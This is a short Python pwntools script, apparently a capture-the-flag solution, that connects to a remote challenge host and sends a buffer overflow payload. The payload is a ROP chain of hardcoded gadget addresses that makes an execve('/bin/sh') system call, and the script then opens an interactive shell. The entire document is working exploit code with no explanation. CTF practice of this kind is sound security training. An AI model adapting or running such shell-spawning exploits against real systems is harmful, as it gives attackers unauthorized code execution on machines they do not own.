from pwn import *

elf = context.binary = ELF('main')

io = remote('chall.ycfteam.in','2222')

pop_rax = pack(0x000000000040114c)
pop_rdi = pack(0x000000000040114a)
pop_rsi = pack(0x0000000000401150)
pop_rdx = pack(0x000000000040114e)
syscall = pack(0x0000000000401159)
bin_sh = pack(0x40206d)

payload = cyclic(40)+pop_rax + pack(59)+pop_rdi + bin_sh + pop_rsi + pack(0) + pop_rdx + pack(0)+syscall

io.sendline(payload)

io.interactive()
